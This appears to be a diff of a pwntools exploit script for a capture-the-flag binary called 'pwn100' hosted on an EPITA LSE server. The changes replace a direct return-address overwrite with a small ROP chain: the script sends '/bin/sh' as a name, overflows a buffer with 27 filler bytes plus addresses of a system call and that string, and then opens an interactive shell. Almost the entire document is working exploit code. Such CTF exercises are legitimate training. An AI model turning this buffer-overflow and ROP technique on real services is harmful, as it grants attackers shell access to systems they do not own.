@@ -4,24 +4,28 @@ from pwn import *
 
 #p = process ('./pwn100')
 
-p = remote('ctf.lse.epita.fr',52114)
+p = remote('lse.epita.fr', 52114)
 
 p.recv()
-p.sendline('admin')
+p.sendline('/bin/sh')
 
 p.recv()
 p.sendline('1')
 
-p.recv()
-p.sendline("A"*27+p32(0xf7ea2f70))
+rop_chain = p32(0x0804881a) # adds system call
+rop_chain += p32(0x8049dc8) # adds address to /bin/sh in name
+
 
 p.recv()
+p.sendline("A"*27+ rop_chain)
 
 p.interactive()
 
-#p64(0x0040084a)
+#0x0804881a - System Call
+#0x8049dc8 - name field
 
-#0x0040091c - gdb breakpoint
 
+
+	
 
 
